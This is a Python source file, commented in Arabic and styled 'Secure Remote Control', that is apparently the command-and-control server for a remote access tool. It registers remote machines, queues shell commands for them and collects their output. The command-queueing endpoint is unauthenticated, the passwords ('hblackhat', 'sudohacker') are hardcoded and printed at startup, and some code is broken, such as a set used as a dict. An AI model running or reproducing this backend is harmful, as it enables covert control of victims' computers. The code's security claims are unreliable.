# server.py - Secure & Compatible Remote Control System
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import urllib.parse
import uuid
import hashlib
import threading
import sqlite3
import os
from datetime import datetime
import socketserver
import secrets

class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
    sessions = {}
    commands_queue = {}
    failed_attempts = {}
    blocked_ips = set()
    
    # نظام مبسط للجلسات
    user_sessions = {}
    SESSION_TIMEOUT = 1800
    
    # نظام كلمات المرور
    PASSWORD_FILE = "passwords.json"
    DEFAULT_PASSWORDS = {
        "user_password": "hblackhat", 
        "admin_password": "sudohacker"
    }
    
    session_lock = threading.Lock()
    MAX_FAILED_ATTEMPTS = 5
    BLOCK_TIME = 1800
    
    SECRET_KEY = secrets.token_hex(32)

    def load_passwords(self):
        """تحميل كلمات المرور من الملف"""
        try:
            if os.path.exists(self.PASSWORD_FILE):
                with open(self.PASSWORD_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return self.DEFAULT_PASSWORDS.copy()
    
    def get_password_hash(self, password_type):
        """إنشاء هاش كلمة المرور مع salt"""
        passwords = self.load_passwords()
        password = passwords.get(password_type, "")
        salt = "ULTRA_SECURE_SALT_2024"
        return hashlib.sha256((password + salt + self.SECRET_KEY).encode()).hexdigest()
    
    def init_database(self):
        """تهيئة قاعدة البيانات"""
        try:
            self.conn = sqlite3.connect('remote_control.db', check_same_thread=False)
            self.conn.execute('PRAGMA journal_mode=WAL')
            self.cursor = self.conn.cursor()
            
            tables = [
                '''CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    command TEXT,
                    response TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )''',
                '''CREATE TABLE IF NOT EXISTS clients (
                    id TEXT PRIMARY KEY,
                    ip TEXT,
                    computer_name TEXT,
                    os TEXT,
                    first_seen DATETIME,
                    last_seen DATETIME,
                    status TEXT
                )''',
                '''CREATE TABLE IF NOT EXISTS security_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT,
                    action TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )'''
            ]
            
            for table in tables:
                try:
                    self.cursor.execute(table)
                except:
                    pass
            self.conn.commit()
        except Exception as e:
            print(f"Database initialization error: {e}")
    
    def log_security_event(self, action):
        """تسجيل أحداث الأمان"""
        try:
            if hasattr(self, 'cursor'):
                self.cursor.execute(
                    'INSERT INTO security_logs (ip, action) VALUES (?, ?)',
                    (self.client_address[0], action)
                )
                self.conn.commit()
        except:
            pass
    
    def is_ip_blocked(self):
        """التحقق إذا كان IP محظور"""
        client_ip = self.client_address[0]
        if client_ip in self.blocked_ips:
            if time.time() - self.blocked_ips[client_ip] > self.BLOCK_TIME:
                del self.blocked_ips[client_ip]
                return False
            return True
        return False
    
    def block_ip(self, ip):
        """حظر IP"""
        self.blocked_ips[ip] = time.time()
        self.log_security_event(f"IP Blocked: {ip}")
        print(f"🚫 BLOCKED: {ip}")
    
    def check_security(self):
        """التحقق الأمني المتقدم"""
        client_ip = self.client_address[0]
        
        if self.is_ip_blocked():
            self.send_error(403, "Access Denied - IP Blocked")
            return False
    
        # تحديد معدل الطلبات
        current_time = time.time()
        if hasattr(self, 'last_request_time'):
            if current_time - self.last_request_time < 0.1:
                self.block_ip(client_ip)
                return False
        
        self.last_request_time = current_time
        return True
    
    def log_message(self, format, *args):
        """تعطيل السجلات المزعجة"""
        pass
    
    def do_GET(self):
        if not self.check_security():
            return
    
        try:
            path = urllib.parse.urlparse(self.path).path
            
            # ⚡ **المسارات العامة التي لا تحتاج مصادقة**
            if path == '/':
                self.send_login_page()
            elif path == '/commands':
                self.handle_get_commands()
            elif path == '/result':
                self.handle_get_result()
            elif path == '/sessions':
                self.send_sessions_list()
            elif path == '/status':
                self.send_system_status()
                
            # 🔒 **المسارات المحمية تحتاج مصادقة**
            elif path in ['/admin-auth', '/control', '/sessions-data', '/settings']:
                self.send_redirect('/')
            else:
                self.send_404_page()
                
        except Exception as e:
            self.send_error(500, str(e))
    
    def do_POST(self):
        """معالجة طلبات POST"""
        if not self.check_security():
            return
            
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 10000:
                self.send_error(413, "Payload too large")
                return
                
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_data) if post_data else {}
            
            # ⚡ **المسارات العامة للعميل**
            if self.path == '/register':
                self.handle_client_register(data)
            elif self.path == '/response':
                self.handle_client_response(data)
            elif self.path == '/ping':
                self.handle_ping(data)
                
            # 🔒 **المسارات المحمية للمستخدمين**
            elif self.path == '/login':
                self.handle_login(data)
            elif self.path == '/admin-login':
                self.handle_admin_login(data)
            elif self.path == '/execute':
                self.handle_execute_command(data)
            elif self.path == '/change-password':
                self.handle_change_password(data)
            elif self.path == '/logout':
                self.handle_logout(data)
                
            # ⚡ **المسار الرئيسي المتوافق مع العميل**
            elif self.path == '/':
                self.handle_main_endpoint(data)
            else:
                self.send_error(404, "Not found")
                
        except Exception as e:
            self.send_json({'error': str(e)})

    # ⚡ **الدوال المتوافقة مع العميل**
    def handle_main_endpoint(self, data):
        """معالجة الطلبات على المسار الرئيسي /"""
        action = data.get('action', '')
        
        if action == 'register' or 'client_id' in data:
            self.handle_client_register(data)
        elif action == 'check_commands' or 'check_commands' in data:
            self.handle_check_commands(data)
        elif action == 'send_response' or 'response' in data:
            self.handle_client_response(data)
        elif action == 'heartbeat' or 'heartbeat' in data:
            self.handle_heartbeat(data)
        else:
            # طلب غير معروف - حاول تسجيله كعميل
            if 'client_id' in data:
                self.handle_client_register(data)
            else:
                self.send_json({'error': 'Unknown action'})

    def handle_client_register(self, data):
        """تسجيل العميل الجديد - متوافق مع العميل"""
        with self.session_lock:
            client_id = data.get('client_id', str(uuid.uuid4())[:8])
            client_ip = self.client_address[0]
            incoming_user = data.get('user', 'Unknown')
            incoming_computer = data.get('computer', 'Unknown')
            incoming_os = data.get('os', 'Unknown')

            if incoming_user == 'Unknown' and '-' in client_id:
                try:
                    parts = client_id.split('-')
                    if len(parts) >= 2:
                        incoming_user = parts[1]
                        incoming_computer = parts[0]
                except:
                    pass
                
            existing_client = None
            for cid, client_data in self.sessions.items():
                current_user = client_data.get('user', '')
                current_computer = client_data.get('computer', '')

                if (current_user == incoming_user and 
                    current_computer == incoming_computer and 
                    incoming_user != 'Unknown' and 
                    incoming_computer != 'Unknown'):
                    existing_client = cid
                    break
                
            if existing_client is None and client_id in self.sessions:
                existing_client = client_id

            if existing_client:
                self.sessions[existing_client]['last_seen'] = datetime.now().isoformat()
                self.sessions[existing_client]['status'] = 'online'
                self.sessions[existing_client]['ip'] = client_ip

                if incoming_os != 'Unknown':
                    self.sessions[existing_client]['os'] = incoming_os

                print(f"✅ Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
                self.send_json({'success': True, 'client_id': existing_client})
            else:
                self.sessions[client_id] = {
                    'id': client_id,
                    'ip': client_ip,
                    'type': data.get('type', 'unknown'),
                    'computer': incoming_computer,
                    'os': incoming_os,
                    'user': incoming_user,
                    'first_seen': datetime.now().isoformat(),
                    'last_seen': datetime.now().isoformat(),
                    'pending_command': None,
                    'last_response': None,
                    'status': 'online'
                }
                print(f"🆕 New: {incoming_computer} ({incoming_user}) - {client_ip}")
                self.send_json({'success': True, 'client_id': client_id})

    def handle_check_commands(self, data):
        """التحقق من الأوامر - متوافق مع العميل"""
        with self.session_lock:
            client_id = data.get('client_id')
            if client_id and client_id in self.sessions:
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                self.sessions[client_id]['status'] = 'online'
                pending_command = self.sessions[client_id]['pending_command']
                
                if pending_command:
                    self.sessions[client_id]['pending_command'] = None
                    self.send_json({
                        'command': pending_command,
                        'action': 'command_received'
                    })
                else:
                    self.send_json({
                        'status': 'waiting', 
                        'action': 'no_commands'
                    })
            else:
                self.send_json({'error': 'Client not found'})

    def handle_heartbeat(self, data):
        """نبضات القلب - متوافق مع العميل"""
        with self.session_lock:
            client_id = data.get('client_id')
            if client_id and client_id in self.sessions:
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                self.sessions[client_id]['status'] = 'online'
                self.send_json({'status': 'alive', 'action': 'heartbeat_ack'})
            else:
                self.handle_client_register(data)

    def handle_get_commands(self):
        """الحصول على الأوامر عبر GET - متوافق مع العميل"""
        with self.session_lock:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            client_id = query.get('client', [None])[0]
            
            if client_id and client_id in self.sessions:
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                pending_command = self.sessions[client_id]['pending_command']
                
                if pending_command:
                    self.sessions[client_id]['pending_command'] = None
                    self.send_json({'command': pending_command})
                else:
                    self.send_json({'waiting': False})
            else:
                self.send_json({'error': 'Client not found'})

    def handle_execute_command(self, data):
        """إرسال أمر جديد إلى العميل"""
        with self.session_lock:
            client_id = data.get('client_id')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['pending_command'] = command
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                self.send_json({'success': True})
                
                if hasattr(self, 'cursor'):
                    self.cursor.execute(
                        'INSERT INTO commands (client_id, command) VALUES (?, ?)',
                        (client_id, command)
                    )
                    self.conn.commit()
            else:
                self.send_json({'success': False, 'error': 'Client not found'})

    def handle_client_response(self, data):
        """استقبال نتيجة الأمر من العميل"""
        with self.session_lock:
            client_id = data.get('client_id')
            response = data.get('response')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['last_response'] = response
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                
                if hasattr(self, 'cursor'):
                    self.cursor.execute(
                        'UPDATE commands SET response = ? WHERE client_id = ? AND command = ? AND response IS NULL',
                        (response, client_id, command)
                    )
                    self.conn.commit()
            
            self.send_json({'success': True})

    def handle_ping(self, data):
        """معالجة طلبات Ping"""
        client_id = data.get('client_id')
        if client_id and client_id in self.sessions:
            self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
        self.send_json({'success': True})

    def handle_get_result(self):
        """الحصول على النتائج من العميل"""
        with self.session_lock:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            
            client_id = query.get('client', [''])[0]
            
            if client_id in self.sessions and self.sessions[client_id]['last_response']:
                result = self.sessions[client_id]['last_response']
                self.sessions[client_id]['last_response'] = None
                self.send_json({'result': result})
            else:
                self.send_json({'pending': True})

    def send_sessions_list(self):
        """إرسال قائمة الجلسات النشطة"""
        with self.session_lock:
            current_time = datetime.now()
            active_clients = []
        
            for client_id, client_data in list(self.sessions.items()):
                last_seen = datetime.fromisoformat(client_data['last_seen'])
                time_diff = (current_time - last_seen).total_seconds()
            
                if time_diff < 60:
                    client_data['is_online'] = time_diff < 30
                    client_data['last_seen_seconds'] = time_diff
                    active_clients.append(client_data)
                else:
                    del self.sessions[client_id]
        
            self.send_json(active_clients)

    def send_system_status(self):
        """إرسال حالة النظام"""
        with self.session_lock:
            status = {
                'uptime': 'Running',
                'connected_clients': len([c for c in self.sessions.values() 
                                        if (datetime.now() - datetime.fromisoformat(c['last_seen'])).total_seconds() < 30]),
                'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'mode': 'SECURE & COMPATIBLE'
            }
            
            if hasattr(self, 'cursor'):
                self.cursor.execute('SELECT COUNT(*) FROM commands')
                status['total_commands'] = self.cursor.fetchone()[0]
            
            self.send_json(status)

    # 🔒 **الدوال المحمية للمستخدمين**
    def handle_login(self, data):
        """معالجة تسجيل الدخول"""
        client_ip = self.client_address[0]
        password = data.get('password', '')
        expected_hash = self.get_password_hash("user_password")
        
        if hashlib.sha256((password + "ULTRA_SECURE_SALT_2024" + self.SECRET_KEY).encode()).hexdigest() == expected_hash:
            session_id = str(uuid.uuid4())
            self.user_sessions[session_id] = {
                'level1': True,
                'ip': client_ip,
                'created_at': time.time()
            }
            self.send_json({'success': True, 'session_id': session_id})
        else:
            self.send_json({'success': False})

    def handle_admin_login(self, data):
        """معالجة تسجيل الدخول كمسؤول"""
        client_ip = self.client_address[0]
        password = data.get('password', '')
        expected_hash = self.get_password_hash("admin_password")
        
        if hashlib.sha256((password + "ULTRA_SECURE_SALT_2024" + self.SECRET_KEY).encode()).hexdigest() == expected_hash:
            self.send_json({'success': True})
        else:
            self.send_json({'success': False})

    def handle_change_password(self, data):
        """تغيير كلمة المرور"""
        level = data.get('level')
        current_password = data.get('current_password')
        new_password = data.get('new_password')
        
        if not level or not current_password or not new_password:
            self.send_json({'success': False, 'error': 'Missing required fields'})
            return
        
        passwords = self.load_passwords()
        
        if level == 'level1':
            current_hash = hashlib.sha256((current_password + "ULTRA_SECURE_SALT_2024" + self.SECRET_KEY).encode()).hexdigest()
            expected_hash = hashlib.sha256((passwords['user_password'] + "ULTRA_SECURE_SALT_2024" + self.SECRET_KEY).encode()).hexdigest()
            
            if current_hash != expected_hash:
                self.send_json({'success': False, 'error': 'Current password is incorrect'})
                return
            
            passwords['user_password'] = new_password
            
        elif level == 'level2':
            current_hash = hashlib.sha256((current_password + "ULTRA_SECURE_SALT_2024" + self.SECRET_KEY).encode()).hexdigest()
            expected_hash = hashlib.sha256((passwords['admin_password'] + "ULTRA_SECURE_SALT_2024" + self.SECRET_KEY).encode()).hexdigest()
            
            if current_hash != expected_hash:
                self.send_json({'success': False, 'error': 'Current admin password is incorrect'})
                return
            
            passwords['admin_password'] = new_password
        
        try:
            with open(self.PASSWORD_FILE, 'w') as f:
                json.dump(passwords, f)
            self.send_json({'success': True})
        except:
            self.send_json({'success': False, 'error': 'Failed to save new password'})

    def handle_logout(self, data):
        """تسجيل الخروج"""
        session_id = data.get('session_id')
        if session_id and session_id in self.user_sessions:
            del self.user_sessions[session_id]
        self.send_json({'success': True})

    def send_json(self, data):
        """إرسال رد JSON"""
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def send_redirect(self, location):
        """إعادة توجيه"""
        self.send_response(302)
        self.send_header('Location', location)
        self.end_headers()

    def send_404_page(self):
        """صفحة 404"""
        self.send_error(404, "Page not found")

    # صفحات الويب (نفس الكود السابق)
    def send_login_page(self):
        """صفحة تسجيل الدخول"""
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Secure Remote Control</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                button { 
                    background: linear-gradient(135deg, #0078d4, #005a9e); 
                    color: white; 
                    cursor: pointer;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">🔒</div>
                <h2>Secure Remote Control</h2>
                <p style="color: #ccc; margin-bottom: 30px;">Level 1 Authentication</p>
                
                <input type="password" id="password" placeholder="Enter Password">
                <button onclick="login()">Authenticate</button>
            </div>
            <script>
                async function login() {
                    const password = document.getElementById('password').value;
                    const response = await fetch('/login', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({password: password})
                    });
                    const data = await response.json();
                    if (data.success) {
                        alert('Login successful! This is a secure system.');
                    } else {
                        alert('Authentication failed!');
                    }
                }
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

def cleanup_sessions():
    """تنظيف الجلسات المنتهية"""
    while True:
        try:
            current_time = datetime.now()
            with EnhancedRemoteControlHandler.session_lock:
                for client_id, client_data in list(EnhancedRemoteControlHandler.sessions.items()):
                    last_seen = datetime.fromisoformat(client_data['last_seen'])
                    if (current_time - last_seen).total_seconds() > 60:
                        del EnhancedRemoteControlHandler.sessions[client_id]
            time.sleep(30)
        except Exception as e:
            print(f"Cleanup error: {e}")

def main():
    handler = EnhancedRemoteControlHandler
    handler.init_database(handler)
    
    threading.Thread(target=cleanup_sessions, daemon=True).start()
    
    port = int(os.environ.get('PORT', 8080))
    
    print("=" * 80)
    print("🔒 SECURE & COMPATIBLE REMOTE CONTROL SERVER")
    print("=" * 80)
    print(f"Server running on port {port}")
    print("Level 1 Password: hblackhat")
    print("Level 2 Password: sudohacker")
    print("✅ Compatible with Linux client")
    print("✅ Secure authentication system")
    print("✅ Real-time command execution")
    print("=" * 80)
    
    try:
        server = ThreadedHTTPServer(('0.0.0.0', port), EnhancedRemoteControlHandler)
        print(f"🚀 Server started! Press Ctrl+C to stop.")
        server.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        if hasattr(handler, 'conn'):
            handler.conn.close()

if __name__ == "__main__":
    main()
